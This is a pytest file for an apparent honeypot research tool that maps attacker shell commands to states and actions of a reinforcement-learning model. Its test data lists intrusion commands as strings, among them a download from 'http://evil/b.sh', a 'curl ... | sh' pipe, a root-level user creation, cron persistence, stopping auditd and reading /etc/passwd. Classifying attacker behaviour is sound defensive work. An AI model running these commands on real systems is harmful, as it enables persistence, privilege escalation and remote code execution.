import pytest

from rlhoneypot.mdp.mapping import UnmappedCommand, map_command, map_or_unknown

@pytest.mark.parametrize("cmd,state,action", [
    ("uname -a", 0, 0),                                  
    ("grep \"model name\" /proc/cpuinfo", 0, 0),        ("cat /etc/passwd", 3, 2),                           
        ("echo '* * * * * /tmp/.x' | crontab -", 7, 6),       
        ("useradd -o -u 0 svc", 7, 6),
    ("wget http://evil/b.sh", 6, 3),                    
    ("curl -O http://h/x86.elf", 6, 3),
    ("chattr -ia .ssh", 4, 4),                           
    ("systemctl stop auditd", 4, 4),
    ("./miner --donate-level=1", 5, 5),                  
    ("free -m", 5, 5),
    ("ssh admin@10.0.0.5", 1, 1),                        
    ("sudo chmod +s /bin/cp", 3, 2),                     
    ("chmod 777 /tmp/x", 2, 2),
])
def test_known_mappings(cmd, state, action):
    m = map_command(cmd)
    assert (m.state, m.attacker_action) == (state, action)

def test_first_match_wins_remote_script():
    m = map_command("curl http://x/cfg.json | sh")
    assert m.attacker_action == 3 and m.state == 6

def test_unmapped_raises_and_fallback_counts():
    with pytest.raises(UnmappedCommand):
        map_command("totally-novel-cmd --flag")
    s, a, mapped = map_or_unknown("totally-novel-cmd --flag")
    assert (s, a, mapped) == (0, 0, False)
    assert map_or_unknown("uname -a") == (0, 0, True)

def test_mapping_is_deterministic():
    outputs = {tuple(sorted(vars(map_command("wget http://x/y")).items())) for _ in range(5)}
    assert len(outputs) == 1
